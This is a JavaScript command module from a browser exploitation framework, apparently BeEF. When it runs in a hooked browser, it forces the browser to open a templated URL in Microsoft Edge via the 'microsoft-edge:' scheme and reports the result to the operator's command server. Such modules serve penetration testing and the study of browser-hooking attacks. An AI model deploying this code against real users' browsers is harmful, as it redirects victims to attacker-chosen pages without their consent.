//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	var edge_url = "<%== @url %>";
	window.location = 'microsoft-edge:' + edge_url;
  server.debug("Attempted to open " + edge_url + " in Microsoft Edge.");
  server.net.send('<%= @command_url %>', <%= @command_id %>, "Attempted to open " + edge_url + " in Microsoft Edge.");
});
